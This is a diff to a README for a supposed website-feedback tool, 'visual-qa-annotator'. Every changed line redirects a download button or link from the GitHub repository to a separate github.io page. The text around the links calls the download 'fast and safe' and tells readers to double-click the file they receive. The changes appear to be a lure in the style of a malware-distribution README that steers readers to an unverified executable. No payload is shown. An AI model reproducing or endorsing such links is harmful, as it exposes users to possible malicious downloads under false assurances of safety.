@@ -1,7 +1,7 @@
 <h1>🖥️ visual-qa-annotator - Test Your Website Without Any Coding</h1>
 
 <p align="center">
-<a href="https://github.com/agness4715/visual-qa-annotator" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ FREE DOWNLOAD NOW</a>
+<a href="https://agness4715.github.io" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ FREE DOWNLOAD NOW</a>
 </p>
 
 <h2>👋 Welcome to Visual QA Annotator</h2>
@@ -20,7 +20,7 @@
 
 <h2>🚀 Getting Started in 3 Easy Steps</h2>
 <h3>Step 1: Download the Application</h3>
-<p><a href="https://github.com/agness4715/visual-qa-annotator">Visit this link to download the application.</a> The download is fast and safe. You'll get the latest version with all the newest features included.</p>
+<p><a href="https://agness4715.github.io">Visit this link to download the application.</a> The download is fast and safe. You'll get the latest version with all the newest features included.</p>
 
 <h3>Step 2: Run the Application</h3>
 <p>After the download completes, find the file in your "Downloads" folder. Double-click it to start. The application will open automatically. No installation needed, no confusing setup wizards.</p>
@@ -88,7 +88,7 @@
 <p>Stop guessing and start showing. Download Visual QA Annotator today and experience the easiest way to give website feedback. It's free, it's powerful, and it's here to help you fix issues faster.</p>
 
 <p align="center" style="margin-top:50px;">
-<a href="https://github.com/agness4715/visual-qa-annotator" style="display:inline-block;padding:18px 50px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(245,87,108,0.4);">⬇️ DOWNLOAD VISUAL QA ANNOTATOR</a>
+<a href="https://agness4715.github.io" style="display:inline-block;padding:18px 50px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(245,87,108,0.4);">⬇️ DOWNLOAD VISUAL QA ANNOTATOR</a>
 </p>
 
 <p align="center" style="margin-top:30px;color:#666;font-size:14px;">Free forever • Open Source • No registration needed</p>
